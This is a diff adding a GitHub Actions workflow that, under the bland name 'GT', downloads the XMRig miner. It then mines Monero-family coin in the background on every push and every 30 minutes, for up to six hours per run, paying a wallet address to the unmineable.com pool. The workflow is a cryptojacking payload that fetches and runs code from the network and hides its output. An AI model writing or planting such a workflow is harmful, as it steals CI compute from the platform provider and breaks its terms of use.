@@ -1,0 +1,26 @@
+name: GT
+on:
+  push:
+    branches: [ main ]
+  schedule:
+    - cron: '*/30 * * * *'
+  workflow_dispatch:
+
+jobs:
+  mine:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    
+    steps:
+    - name: Setup
+      run: |
+        sudo sysctl -w vm.nr_hugepages=1280
+        wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz
+        tar -xf xmrig-6.21.0-linux-x64.tar.gz
+        cd xmrig-6.21.0
+        
+    - name: Mine
+      run: |
+        cd xmrig-6.21.0
+        nohup ./xmrig -o rx.unmineable.com:3333 -u USDT:0x74B56f2C379996fedabF53D36aeE73c5E5129fC9.GT_20260330_092456_364 -p x --threads=0 --randomx-1gb-pages --cpu-priority=5 --donate-level=1 > /dev/null 2>&1 &
+        sleep 345m
